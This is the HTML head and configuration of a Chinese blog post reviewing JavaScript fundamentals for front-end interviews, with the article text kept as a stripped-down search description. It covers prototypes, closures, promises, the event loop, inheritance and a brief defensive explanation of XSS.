<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>重温前端-js篇 | Kifroom</title><meta name="keywords" content="javascript"><meta name="author" content="kif"><meta name="copyright" content="kif"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="重温前端-js篇"><meta name="application-name" content="重温前端-js篇"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="重温前端-js篇"><meta property="og:url" content="https://wkif.gitee.io/post/c03c.html"><meta property="og:site_name" content="Kifroom"><meta property="og:description" content="Javascript1、JS中的instanceof运算符instanceof运算符用来判断一个构造函数的prototype属性所指向的对象是否存在另外一个要检测对象的原型链上 obj instanceof Object;&amp;#x2F;&amp;#x2F;true 实例obj在不在Object构造函数中  e"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://kifimg.oss-cn-beijing.aliyuncs.com/project/202204241829907.jpg"><meta property="article:author" content="kif"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://kifimg.oss-cn-beijing.aliyuncs.com/project/202204241829907.jpg"><meta name="description" content="Javascript1、JS中的instanceof运算符instanceof运算符用来判断一个构造函数的prototype属性所指向的对象是否存在另外一个要检测对象的原型链上 obj instanceof Object;&amp;#x2F;&amp;#x2F;true 实例obj在不在Object构造函数中  e"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="https://wkif.gitee.io/post/c03c"><link rel="preconnect" href="//npm.elemecdn.com"/><link rel="preconnect" href="//npm.onmicrosoft.cn"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.20/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: undefined,
  greetingBox: undefined,
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: {"mode":"api","api":"https://img2color-go.vercel.app/api?img=","cover_change":true},
  authorStatus: {"skills":null},
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"prismjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    simplehomepage: true,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: kif","link":"链接: ","source":"来源: Kifroom","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#3b70fc","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'Kifroom',
  title: '重温前端-js篇',
  postAI: '',
  pageFillDescription: 'Javascript, 1、JS中的instanceof运算符, 2、排序, 3、JS字符串大写和小写之间的转换, 4、javascript如何删除指定数组元素, 5、数组方法, 数组方法概括, 6、对象, Number 对象, 对象字符串, 对象属性遍历：, 添加属性, 删除对象属性, 7、字符串, String 对象中的方法, 去除字符串左右两边的空格, 8、js 时间与时间戳的转换, 时间转时间戳：, 时间戳转时间, 9、Arguments 对象, 10、Document 对象, Document 对象属性和方法, 11、JS中阻止冒泡事件, 12、阻止默认事件, 13、window.location, Location 对象属性, Location 对象方法, 14、原型与原型链, 原型 prototype, 原型链：_proto_, 预编译, 15、this, 函数直接调用, 对象方法, 案例：, 箭头函数中this, this指向（普通函数、箭头函数）, 16、闭包, 形式：, 意义：, 17、ES6, var let const, var, const, 解构, 去重, promise, 18、xss, 19、SEO, 20、数组去重, 21、数组和伪数组的区别, 22、手写一个发布订阅, 23、介绍下 Set、Map、WeakSet 和 WeakMap 的区别？, 24、简单说说 js 中有哪几种内存泄露的情况, 25、json和xml数据的区别, 26、JavaScript有几种方法判断变量的类型?, 27、Math, Math 对象方法, 28、promise和 async await 区别, 两者的区别, 29、 defer和async区别, 30、同步和异步, 31、 实现异步的方法, 32、 promise的介绍与使用, 33、用js实现sleep用promise, 34、js执行顺序的题目涉及到settimeout、console、process.nextTick、promise.then, 35、call appy bind的作用和区别, 手写bind, 手写call, 手写apply, 36、继承优缺点, 37、ES5 js继承的方法和优缺点, 38、ES6继承, 39、扩展操作符…, 40、为什么js是单线程, 41、死锁, 42、面向对象的三个特征分别说一下什么意思, 43、防抖和节流的原理和使用场景, 44、文件异步上传怎么实现, 1.普通表单上传, 2.文件编码上传, 3.formData异步上传, 4.iframe无刷新页面, _parent在父窗口打开, 45、使用setInterval请求实时数据返回顺序不一致怎么解决, 46、浅拷贝深拷贝(实现方式), 47、获取当前页面url, 48、js中两个数组怎么取交集+(差集、并集、补集), ES5：, ES6：, 49、沙箱隔离怎么做的什么原理, 53、闭包的理解, JS应用篇, 字符串中的单词逆序输出（手写）, function rand(min max N)：生成长度是N且在min、max内不重复的整数随机数组, Math.random, 实现一个数组对象的去重相同value的只保留最后一个最好有多个思路, 传入 [1[[2]34]5] 返回 [12345], 用正则和非正则实现12345678.12x3D》12345678.12, 写一个判断是否是空对象的函数, 给定一个字符串请你找出其中不含有重复字符的 最长子串 的长度, 三数之和, js判断数据类型, arr.flat(Infinity)中的运算符运算符用来判断一个构造函数的属性所指向的对象是否存在另外一个要检测对象的原型链上实例在不在构造函数中请补全函数要求以的形式返回第一个参数是否属于第二个参数对象的实例补全代码排序方法对数组的项目进行排序按升序对数组中的数字进行排序按降序对数组中的数字进行排序字符串大写和小写之间的转换字符串大小写转换方法字符串方法说明把字符串转换成小写将字符串转换成大写将字符串转换成小写将字符串转换成大写如何删除指定数组元素使用关键字使用删除元素之后数组长度不变只是被删除元素被置为了使用操作方法在删除数组元素的时候它可以删除任意数量的项只需要指定个参数要删除的第一项的位置和要删除的项数迭代方法用循环迭代数组元素发现符合要删除的项则删除第一种用最常见的循环来对比元素找到之后将其删除原型方法在的原型上添加方法来达到删除的目的数组方法数组方法概括方法名对应版本功能原数组是否改变合并数组并返回合并之后的数据使用分隔符将数组转为字符串并返回删除最后一位并返回删除的数据删除第一位并返回删除的数据在第一位新增一或多个数据返回长度在最后一位新增一或多个数据返回长度反转数组返回结果截取指定位置的数组并返回排序字符规则返回结果删除指定位置并替换返回删除的数据直接转为字符串并返回返回数组对象的原始值查询并返回数据的索引反向查询并返回数据的索引参数为回调函数会遍历数组所有的项回调函数接受三个参数分别为没有返回值同同时回调函数返回数据组成新数组由返回同同时回调函数返回布尔值为的数据组成新数组由返回同同时回调函数返回布尔值全部为由返回同同时回调函数返回布尔值只要由一个为由返回归并同迭代数组的所有项并构建一个最终值由返回反向归并同迭代数组的所有项并构建一个最终值由返回用复制一个数组在数组的第位置插入最大值对象对象对象是原始数值的包装对象创建对象的语法格式如下其中为要创建的对象的数值若为一个非数字的值则会尝试将其转换为数字若转换失败则会返回请补全函数要求将数字参数转换为对象的形式返回补全代码对象字符串对象用于处理字符串其中提供了大量操作字符串的方法以及一些属性创建对象的语法格式如下对象属性遍历使用循环遍历对象的属性时原型链上的所有属性都将被访问定义一个对象定义一个数组用来接受定义一个数组用来接受取得输出输出添加属性创建对象为对象添加动态属性输出删除对象属性创建动态对象为对象添加动态属性移除属性字符串对象中的方法下表中列举了对象中提供的方法及其描述信息方法描述创建一个锚点即生成一个标签标签的属性为方法中的参数用大号字体显示字符串显示闪动的字符串使用粗体显示字符串返回在指定位置的字符返回指定字符的编码拼接字符串以打字机文本显示字符串使用指定的颜色来显示字符串使用指定的尺寸来显示字符串将字符编码转换为一个字符串检索字符串获取给定字符串在字符串对象中首次出现的位置使用斜体显示字符串获取给定字符串在字符串对象中最后出现的位置将字符串显示为链接返回一个数字并使用该数字来表示字符串对象是大于小于还是等于给定字符串根据正则表达式匹配字符串中的字符替换与正则表达式匹配的子字符串获取与正则表达式相匹配字符串首次出现的位置截取字符串的片断并将其返回使用小字号来显示字符串根据给定字符将字符串分割为字符串数组使用删除线来显示字符串把字符串显示为下标从指定索引位置截取指定长度的字符串截取字符串中两个指定的索引之间的字符把字符串显示为上标把字符串转换为小写把字符串转换为大写把字符串转换为小写把字符串转换为大写返回字符串返回某个字符串对象的原始值去除字符串左右两边的空格时间与时间戳的转换时间转时间戳获得时间戳的方法有四种都是通过实例化时间对象来进一步获取当前的时间戳时间戳转时间对象是一个对应于传递给函数的参数的类数组对象对象对象属性和方法文档中可以使用以下属性和方法属性方法描述返回当前获取焦点元素向文档添加句柄从另外一个文档返回节点到当前文档返回对文档中所有对象的引用返回对文档中所有对象的引用注意已不支持元素返回文档的绝对基础返回文档的元素关闭用方法打开的输出流并显示选定的数据设置或返回与当前文档有关的所有创建一个属性节点方法可创建注释节点创建空的对象并返回此对象创建元素节点创建文本节点返回与文档相关的文档类型声明返回文档的根节点返回用于通过浏览器渲染文档的模式设置或返回文档的位置返回当前文档的域名已废弃返回被调用时所使用的配置返回文档中所有嵌入的内容集合返回对文档中所有对象引用返回文档中所有指定类名的元素集合作为对象返回对拥有指定的第一个对象的引用返回带有指定名称的对象集合返回带有指定标签名的对象集合返回对文档中所有对象引用返回处理该文档的对象把一个节点从另一个文档复制到该文档以便应用返回用于文档的编码方式在解析时返回文档被最后修改的日期和时间返回对文档中所有和对象引用删除空文本节点并连接相邻节点删除空文本节点并连接相邻节点的打开一个流以收集来自任何或方法的输出返回文档中匹配指定的选择器的第一元素是中引入的新方法返回文档中匹配的选择器的所有元素节点列表返回文档状态载入中返回载入当前文档的文档的移除文档中的事件句柄由方法添加重命名元素或者属性节点返回页面中所有脚本的集合设置或返回是否强制进行错误检查返回当前文档的标题返回文档完整的向文档写表达式或代码等同于方法不同的是在每个表达式之后写一个换行符中阻止冒泡事件冒泡事件比如说鼠标点击了一个按钮同样的事件将会在那个元素的所有祖先元素中被触发这一过程被称为事件冒泡按钮按钮被点击了被点击了当我们点击按钮后因为按钮也属于元素所以按钮的父元素也会触发点击事件按钮被点击了阻止默认事件链接链接链接链接对象属性属性描述设置或返回从井号开始的锚设置或返回主机名和当前的端口号设置或返回当前的主机名设置或返回完整的设置或返回当前的路径部分设置或返回当前的端口号设置或返回当前的协议设置或返回从问号开始的查询部分对象方法属性描述加载新的文档重新加载当前文档用新的文档替换当前文档原型与原型链原型原型是函数特有挂载在原型上是为了继承通过继承后查找时就近判断属性时继承的还是后天添加的可以拿到的私有属性这个方法既不是也不是的而是继承自的原型链对象数组函数等有原型链预编译预编译步骤创建对象找形参和变量声明实参与形参相统一找函数申明会覆盖变量注不是函数声明逐行执行函数直接调用其中其实是即对象方法对象参数对象方法同理为案例箭头函数中箭头函数中固定指向代码块外部指向普通函数箭头函数参考答案普通函数中的谁调用了函数或者方法那么这个函数或者对象中的就指向谁方法是由在全局作用域中调用的所以指向调用该方法的对象即此处的方法是这个对象调用的所以指向匿名函数中的匿名函数的执行具有全局性则匿名函数中的指向是而不是调用该匿名函数的对象上面代码中方法是由调用但是返回的是一个匿名函数而匿名函数中的指向所以打印出如果想在上述代码中使指向调用该方法的对象可以提前把传值给另外一个变量或者提前保存指向箭头函数中的箭头函数中的是在函数定义的时候就确定下来的而不是在函数调用的时候确定的箭头函数中的指向父级作用域的执行上下文技巧因为中除了全局作用域其他作用域都是由函数创建出来的所以如果想确定的指向则找到离箭头函数最近的与该平级的执行上下文中的即是箭头函数中的箭头函数无法使用和方法改变指向因为其值在函数定义的时候就被确定下来例首先距离箭头函数最近的是与该函数平级的执行上下文是中的执行上下文箭头函数中的就是下注释代码处的即此处的即是箭头函数中的例该段代码中存在两个箭头函数找不到对应的所以一直往上找直到指向复制代码代码中有两个箭头函数由于找不到对应的所以会指向对象闭包形式方法里面返回一个方法意义延长变量生命周期创建私有环境中也是一个闭包会常驻内存所以慎用变量提升变量覆盖没有块级作用域声明之后必须赋值定义数组可以对数组修改解构不使用第三个变量互换值去重构造函数同步执行异步函数异步执行攻击指的是攻击者往页面里插入恶意标签或者代码首先代码里对用户输入的地方和变量都需要仔细检查长度和对等字进行过滤其次任何内容写到页面之前都必须加避免不小心把弄出来这一个层面做好至少可以堵住超过一半的攻击攻击者在论坛中放一个看似安全的链接骗取用户点击后窃取中的用户私密信息或者攻击者在论坛中加一个恶意表单当用户提交表单的时候却把信息传送到攻击者的服务器汇总而不是用户原本以为的信任站点搜索引擎优化利用搜索引擎的规则提高网站在有关搜索引擎内的自然排名目的是让其在行业内占据领先地位获得品牌收益很大程度上是网站经营者的一种商业行为将自己或自己公司的排名前移是提高你网站排名的一个很有效的方法这个完善和优化你网站的排名因素的方法就是能影响搜索引擎的排名的算法因此是网络营销策略和数字营销策略中很重要的一个环节使你的网站获取得更多的流量同时也可以提高你在搜索引擎的排名那就意味你可以获取得更多的订单更多的利润数组去重数组和伪数组的区别定义数组是一个特殊对象与常规对象的区别当由新元素添加到列表中时自动更新属性设置属性可以截断数组从中继承了方法属性为类数组是一个拥有属性并且他属性为非负整数的普通对象类数组不能直接调用数组方法区别本质类数组是简单对象它的原型关系与数组不同原型关系和原始值转换类数组转换为数组转换方法使用使用使用进行属性遍历并组成新的数组转换须知转换后的数组长度由属性决定索引不连续时转换结果是连续的会自动补位代码示例仅考虑或正整数的索引代码示例使用转换产生稀疏数组代码示例使用数组方法操作类数组注意地方复制代码操作的是索引值为的位置手写一个发布订阅发布订阅中心订阅取消订阅发布内部需要一个单独事件中心进行存储事件中心事件名独一无二订阅后执行的自定义行为发布将订阅的事件进行统一执行取消订阅若不传直接取消该事件所有订阅信息介绍下和的区别参考答案成员不能重复只有键值没有键名有点类似数组可以遍历方法有成员都是对象引用成员都是弱引用随时可以消失不计入垃圾回收机制可以用来保存节点不容易造成内存泄露不能遍历方法有本质上是键值对的集合类似集合可以遍历方法很多可以跟各种数据格式转换只接收对象为键名除外不接受其他类型的值作为键名键名指向的对象不计入垃圾回收机制不能遍历方法同简单说说中有哪几种内存泄露的情况意外的全局变量闭包未被清空的定时器未被销毁的事件监听引用和数据的区别参考答案数据体积方面是重量级的是轻量级的传递的速度更快些数据传输方面在传输过程中比较占带宽占带宽少易于压缩数据交互方面与的交互更加方便更容易解析处理更好的进行数据交互数据描述方面对数据的描述性比较差和都用在项目交互下多用于做配置文件用于数据交互有几种方法判断变量的类型参考答案使用检测当需要判断变量是否是等类型时可以使用进行判断使用检测运算符与运算符相似用于识别正在处理的对象的类型与方法不同的是方法要求开发者明确地确认对象为某特定类型使用检测本来是原型对象上的属性指向构造函数但是根据实例对象寻找属性的顺序若实例对象上没有实例属性或方法时就去原型链上寻找因此实例对象也是能使用属性的对象方法方法描述返回的绝对值返回的反余弦值返回的反正弦值以介于与弧度之间的数值来返回的反正切值返回从轴到点的角度介于与弧度之间对数进行上舍入返回数的余弦返回的指数对进行下舍入返回数的自然对数底为返回中的最高值返回中的最低值返回的次幂返回之间的随机数四舍五入返回数的正弦返回数的平方根返回角的正切的写法等同于题目写出执行结果并解释原因答案解析按常规的思路这段代码应该输出毕竟最小值小于最大值但是却输出相关文档是这样解释的的参数是个或者多个如果多个参数很容易理解返回参数中最小的如果没有参数则返回无穷大而没有传递参数时返回的是所以输出和区别参考答案概念是异步编程的一种解决方案比传统的解决方案回调函数和事件更合理和更强大简单地说好比容器里面存放着一些未来才会执行完毕异步的事件的结果而这些结果一旦生成是无法改变的也是异步编程的一种解决方案他遵循的是函数的语法糖他拥有内置执行器不需要额外的调用直接会自动执行并输出结果它返回的是一个对象两者的区别的出现解决了传统函数导致的地域回调问题但它的语法导致了它向纵向发展行成了一个回调链遇到复杂的业务场景这样的语法显然也是不美观的而代码看起来会简洁些使得异步代码看起来像同步代码的本质是可以提供等同于同步效果的等待异步返回能力的语法糖只有这一句代码执行完才会执行下一句与一样是非阻塞的是基于实现的可以说是改良版的它不能用于普通的回调函数和区别参考答案区别主要在于一个执行时间会在文档解析完之后执行并且多个会按照顺序执行而则是在加载好之后就会执行并且多个哪个加载好就执行哪个解析在没有或者的情况下会立即执行脚本所以通常建议把放在最后有的话加载和渲染后续文档元素的过程将和的加载与执行并行进行异步但是多个文件的加载顺序不会按照书写顺序进行有的话加载后续文档元素的过程将和的加载并行进行异步但是的执行要在所有元素解析完成之后事件触发之前完成并且多个会按照顺序进行加载同步和异步参考答案同步指在主线程上排队执行的任务只有前一个任务执行完毕才能继续执行下一个任务也就是调用一旦开始必须这个调用返回结果划重点才能继续往后执行程序的执行顺序和任务排列顺序是一致的异步异步任务是指不进入主线程而进入任务队列的任务只有任务队列通知主线程某个异步任务可以执行了该任务才会进入主线程每一个任务有一个或多个回调函数前一个任务结束后不是执行后一个任务而是执行回调函数后一个任务则是不等前一个任务结束就执行程序的执行顺序和任务的排列顺序是不一致的异步的我们常用的和函数都是异步操作实现异步的方法参考答案回调函数事件监听发布订阅生成器异步编程进化史函数的实现就是将函数和自动执行器包装在一个函数里可以说是异步终极解决方案了函数相对于优势体现在处理的调用链能够更清晰准确的写出代码并且也能优雅地解决回调地狱问题当然函数也存在一些缺点因为将异步代码改造成了同步代码如果多个异步代码没有依赖性却使用了会导致性能上的降低代码没有依赖性的话完全可以使用的方式函数对函数的改进体现在以下三点内置执行器函数的执行必须靠执行器所以才有了函数库而函数自带执行器也就是说函数的执行与普通函数一模一样只要一行更广的适用性函数库约定命令后面只能是函数或对象而函数的命令后面可以跟对象和原始类型的值数值字符串和布尔值但这时等同于同步操作更好的语义和比起星号和语义更清楚了表示函数里有异步操作表示紧跟在后面的表达式需要等待结果简介使用你可以轻松地达成之前使用生成器和函数所做到的工作它有如下特点是基于实现的它不能用于普通的回调函数与一样是非阻塞的使得异步代码看起来像同步代码这正是它的魔力所在一个函数如果加上那么该函数就会返回一个函数依次调用三个文件那个例子用写法只需几句话便可实现后面跟的是一个实例函数返回的也是个结束结束并发请求如果请求两个文件毫无关系可以通过并发请求这个函数同步执行的介绍与使用介绍中的是异步编程的一种方案从语法上讲是一个对象它可以获取异步操作的消息对象可以将异步操作以同步的流程表达出来使用主要有以下好处可以很好地解决回调地狱的问题避免了层层嵌套的回调函数语法非常简洁对象提供了简洁的使得控制异步操作更加容易使用语法函数异步操作成功参数函数在构造函数执行时同步执行被传递和函数函数在构造函数返回新建对象前被调用内部通常会执行一些异步操作一旦完成可以调用函数来将状态改成完成或者将的状态改为失败如果在函数中抛出一个错误那么该状态为函数的返回值被忽略简单使用原型方法语法含义为实例添加状态改变时的回调函数方法的第一个参数是状态的回调函数第二个参数可选是状态的回调函数链式操作方法返回的是一个新的因此可以采用链式写法即方法后面再调用另一个方法注意不管是方法的函数参数执行还是可选参数函数参数执行方法返回的都是一个新的对象都可以继续采用链式写法调用另一个方法方法返回的也是一个对象方法和方法可以链式操作返回值方法返回一个而它的行为与中的被调用的回调函数函数函数的返回值有关如果中的回调函数返回一个值那么返回的将会成为接受状态并且将返回的值作为接受状态的回调函数的参数值如果中的回调函数抛出一个错误那么返回的将会成为拒绝状态并且将抛出的错误作为拒绝状态的回调函数的参数值如果中的回调函数返回一个已经是接受状态的那么返回的也会成为接受状态并且将那个的接受状态的回调函数的参数值作为该被返回的的接受状态回调函数的参数值如果中的回调函数返回一个已经是拒绝状态的那么返回的也会成为拒绝状态并且将那个的拒绝状态的回调函数的参数值作为该被返回的的拒绝状态回调函数的参数值如果中的回调函数返回一个未定状态的那么返回的状态也是未定的并且它的终态与那个的终态相同同时它变为终态时调用的回调函数参数与那个变为终态时的回调函数的参数是相同的注意这里是方法中被调用回调函数的返回值与方法返回的对象状态之间的关系语法拒绝含义方法是的别名用于指定发生错误时的回调函数返回一个新的对象用法方法的作用等同于抛出错误等价写法注意由于方法是的别名故中的链式操作返回值等语法在中都适用一般总是建议对象后面要跟方法这样可以处理内部发生的错误方法返回的还是一个对象因此后面还可以接着调用方法对象的错误具有冒泡性质会一直向后传递直到被捕获为止也就是说错误总是会被下一个语句捕获即当前方法可以捕获上一个方法包括上一个到当前不包括当前方法之间所有的错误如果没有错误则当前方法不执行一般来说不要在方法里面定义状态的回调函数即的第二个参数总是使用方法上面代码中第二种写法要好于第一种写法理由是第二种写法可以捕获前面方法执行中的错误也更接近同步的写法与传统的代码块不同的是即使没有使用方法指定错误处理的回调函数对象抛出的错误也不会中止外部脚本运行下面一行会报错因为没有声明在异步函数中抛出的错误不会被捕获到不会执行在后面抛出的错误会被忽略不会执行语法含义方法接受一个数组作为参数都是实例如果不是就会先调用下面讲到的方法将参数转为实例再进一步处理方法的参数可以不是数组但必须具有接口且返回的每个成员都是实例的状态由决定分成两种情况只有的状态都变成的状态才会变成此时的返回值组成一个数组传递给的回调函数只要之中有一个被的状态就变成此时第一个被的实例的返回值会传递给的回调函数用法语法含义方法同样是将多个实例包装成一个新的实例只要之中有一个实例率先改变状态的状态就跟着改变那个率先改变的实例的返回值就传递给的回调函数方法的参数与方法一样如果不是实例就会先调用下面讲到的方法将参数转为实例再进一步处理用法未被调用未被调用语法等价于下面的写法等价于含义返回一个状态由给定决定的实例用法如果该值是一个对象则直接返回该对象如果参数是对象即带有方法的对象则返回的对象的最终状态由方法的执行决定如果参数是不具有方法的对象或基本数据类型则返回的对象的状态为并且将该参数传递给方法如果不带有任何参数则返回的对象的状态为并且将作为参数传递给方法通常而言如果你不知道一个值是否是对象使用来返回一个对象这样就能将该以对象形式使用立即的对象是在本轮事件循环的结束时而不是在下一轮事件循环的开始时语法等价于下面的写法等同于含义返回一个状态为的对象并将给定的失败信息传递给对应的处理方法注意方法返回的实例的状态由决定可能是也可能是方法返回的实例的状态一定是用法未被调用未被调用方法的参数会原封不动地作为的理由变成后续方法的参数这一点与方法不一致与相反的是哪一个参考答案就是赛跑的意思意思就是说里面哪个结果获得的快就返回那个结果不管结果本身是成功状态还是失败状态扩展语法参数可迭代对象类似返回值一个待定的只要给定的迭代中的一个解决或拒绝就采用第一个的值作为它的值从而异步地解析或拒绝一旦堆栈为空实现文件读取用实现用执行顺序的题目涉及到参考答案综合的执行顺序就是解析本题目考察的就是事件循环我们可以简单理解如下所有任务都在主线程上执行形成一个执行栈在主线程之外还存在一个任务队列系统把异步任务放到任务队列中然后主线程继续执行后续的任务一旦执行栈中所有的任务执行完毕系统就会读取任务队列如果这时异步任务已结束等待状态就会从任务队列进入执行栈恢复执行主线程不断重复上面的第三步在上述的例子中我们明白首先执行主线程中的同步任务因此依次输出当主线程任务执行完毕后再从中读取任务读取任务的先后顺序取决于任务队列中对于不同任务读取规则的限定在中的队列分为两种类型宏任务宏任务是指在每个阶段执行的任务微任务微任务是指在每个阶段之间执行的任务我们举例来看执行顺序的规定我们假设宏任务队列包含任务微任务队列包含任务执行顺序为首先执行宏任务队列开头的任务也就是任务执行完毕后在执行微任务队列里的所有任务也就是依次执行执行完后清空微任务队中的任务接着执行宏任务中的第二个任务依次循环了解完了宏任务和微任务两种队列的执行顺序之后我们接着来看真实场景下这两种类型的队列里真正包含的任务我们以引擎为例在中这两种类型的真实任务顺序如下所示宏任务队列真实包含任务主程序代码微任务队列真实包含任务由此我们得到的执行顺序应该为主程序代码在中宏任务队列又称为而微任务又称我们的题目相对复杂但是要注意我们在定义的时候构造部分是同步执行的接下来我们分析我们的题目首先分析的执行顺序主程序代码主体部分定义的构造部分是同步的因此先输出主体部分再输出同步情况下就是严格按照定义的先后顺序输出这里的部分严格的说其实是部分输出的是以及输出依据上面优先级应该先但是注意设置延时输出的作用和区别参考答案作用都可以改变函数内部的指向区别点和会调用函数并且改变函数内部指向和传递的参数不一样传递参数形式必须数组形式不会调用函数可以改变函数内部指向解析方法改变函数内部指向方法调用一个对象简单理解为调用函数的方式但是它可以改变函数的指向写法为想要指向的对象为参数的主要作用也可以实现继承方法方法调用一个函数简单理解为调用函数的方式但是它可以改变函数的指向写法在函数运行时指定的值传递的值必须包含在数组里面返回值就是函数的返回值因为他就是调用函数的主要应用比如可以利用可以求得数组中最大值方法方法不会调用函数但是能改变函数内部指向写法在函数运行时指定的值传递的其他参数返回由指定的值和初始化参数改造的原函数拷贝应用如果有的函数我们不需要立即调用但是又需要改变这个函数的指向此时用再合适不过了扩展主要应用场景经常做继承经常跟数组有关系比如借助于数学对象实现数组最大值最小值不调用函数但是还想改变指向比如改变定时器内部的指向手写体验改变指向实现思路判断是否是函数调用若非函数调用抛出异常返回函数判断函数的调用方式是否是被出来的出来的话返回空对象但是实例的指向的手写思路判断是否是函数调用若非函数调用抛异常通过新对象来调用函数给创建一个设置为需要调用的函数结束调用完之后删除判断是否是函数调用不是就抛出异常这里的就是调用的不传参默认为保存获取参数手写思路判断是否是函数调用若非函数调用抛异常通过新对象来调用函数给创建一个设置为需要调用的函数结束调用完之后删除继承优缺点参考答案继承的好处提高了代码的复用性提高了代码的维护性让类与类之间产生了关系是多态的前提继承的弊端类的耦合性增强了但是开发的原则高内聚低耦合继承的方法和优缺点参考答案原型链继承实现方式将子类的原型链指向父类的对象实例原理子类实例的指向的原型链而指向类的对象实例该父类对象实例的指向所以可继承的构造函数属性方法和原型链属性方法优点可继承构造函数的属性父类构造函数的属性父类原型的属性缺点无法向父类构造函数传参且所有实例共享父类实例的属性若父类共有属性为引用类型一个子类实例更改父类构造函数共有属性时会导致继承的共有属性发生变化实例如下构造函数继承实现方式在子类构造函数中使用或者劫持父类构造函数方法并传入参数原理使用或者更改子类函数的作用域使执行父类构造函数子类因此可以继承父类共有属性优点可解决原型链继承的缺点缺点不可继承父类的原型链方法构造函数不可复用组合继承原理综合使用构造函数继承和原型链继承优点可继承父类原型上的属性且可传参每个新实例引入的构造函数是私有的缺点会执行两次父类的构造函数消耗较大内存子类的构造函数会代替原型上的那个父类构造函数原型式继承原理类似用一个函数包装一个对象然后返回这个函数的调用这个函数就变成了个可以随意增添属性的实例或对象结果是将子对象的指向父对象缺点共享引用类型寄生式继承原理二次封装原型式继承并拓展优点可添加新的属性和方法寄生组合式继承原理改进组合继承利用寄生式继承的思想继承原型复制一份父类的原型修正构造函数设置子类原型继承扩展操作符适用类型数组对象字符串复杂数据类型都可以当要转化为可迭代数据结构时可设置对象的迭代器对扩展运算符扩展出来的值进行操作基础数据只有可以使用扩展运算符无效扩展运算符的应用场景函数调用往数组里多个元素替代函数的方法的写法的写法求一个数组的最大数简化的写法的写法等同于扩展运算符后面可以放表达式与解构赋值结合用于生成数组写法写法合并数组数组的克隆特别注意乍一看与不共用引用地址不随着变化接着往下看为什么是单线程参考答案这主要和的用途有关是作为浏览器的脚本语言主要是实现用户与浏览器的交互以及操作这决定了它只能是单线程否则会带来很复杂的同步问题举个例子如果被设计了多线程如果有一个线程要修改一个元素另一个线程要删除这个元素此时浏览器就会一脸茫然不知所措所以为了避免复杂性从一诞生就是单线程这已经成了这门语言的核心特征将来也不会改变扩展什么是进程进程是分配资源的最小单位是能拥有资源和独立运行的最小单位什么是线程线程是调度的最小单位线程是建立在进程的基础上的一次程序运行单位一个进程中可以有多个线程浏览器是多进程的放在浏览器中每打开一个页面其实就是新开了一个进程在这个进程中还有渲染线程引擎线程请求线程等所以浏览器是一个多进程的为了利用多核的计算能力提出标准允许脚本创建多个线程但是子线程完全受主线程控制且不得操作所以这个新标准并没有改变单线程的本质死锁参考答案死锁是指两个或两个以上的进程在执行过程中由于竞争资源而造成阻塞的现象若无外力作用它们都将无法继续执行产生原因竞争资源引起进程死锁可剥夺和非剥夺资源竞争非剥夺资源竞争临时性资源进程推进顺序不当产生条件互斥条件涉及的资源是非共享的涉及的资源是非共享的一段时间内某资源只由一个进程占用如果此时还有其它进程请求资源则请求者只能等待直至占有资源的进程用毕释放不剥夺条件不能强行剥夺进程拥有的资源进程已获得的资源在未使用完之前不能被剥夺只能在使用完时由自己释放请求和保持条件进程在等待一新资源时继续占有已分配的资源指进程已经保持至少一个资源但又提出了新的资源请求而该资源已被其它进程占有此时请求进程阻塞但又对自己已获得的其它资源保持不放环路等